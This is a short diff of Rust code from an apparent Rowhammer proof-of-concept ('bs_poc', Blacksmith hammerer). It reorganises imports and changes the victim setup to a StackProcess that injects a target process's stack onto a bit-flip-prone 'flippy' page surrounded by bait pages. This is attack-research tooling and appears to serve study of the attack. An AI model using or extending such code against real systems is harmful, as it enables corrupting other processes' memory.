@@ -7,8 +7,6 @@ use std::{
 };
 
 use anyhow::bail;
-use bs_poc::hammerer::blacksmith::hammerer::{FuzzSummary, HammeringPattern, PatternAddressMapper};
-use bs_poc::hammerer::Hammering;
 use bs_poc::memory::mem_configuration::MemConfiguration;
 use bs_poc::{
     allocator,
@@ -23,6 +21,11 @@ use bs_poc::{
     hammerer::Hammerer,
 };
 use bs_poc::{hammerer::blacksmith::blacksmith_config::BlacksmithConfig, victim::HammerVictim};
+use bs_poc::{
+    hammerer::blacksmith::hammerer::{FuzzSummary, HammeringPattern, PatternAddressMapper},
+    memory::PfnResolver,
+};
+use bs_poc::{hammerer::Hammering, victim::stack_process::InjectionConfig};
 use bs_poc::{
     memory::{BytePointer, ConsecBlocks, ConsecCheckBankTiming, ConsecCheckNone, ConsecCheckPfn},
     retry,
@@ -446,7 +449,15 @@ unsafe fn _main() -> anyhow::Result<()> {
         let victim = if args.target.is_empty() {
             None
         } else {
-            Some(victim::Process::new(&args.target)?)
+            //Some(victim::Process::new(&args.target)?)
+            Some(victim::StackProcess::new(
+                &args.target,
+                InjectionConfig {
+                    flippy_page: addr as *mut libc::c_void,
+                    bait_count_after: 8,
+                    bait_count_before: 10,
+                },
+            )?)
         };
         match victim {
             Some(mut victim) => {
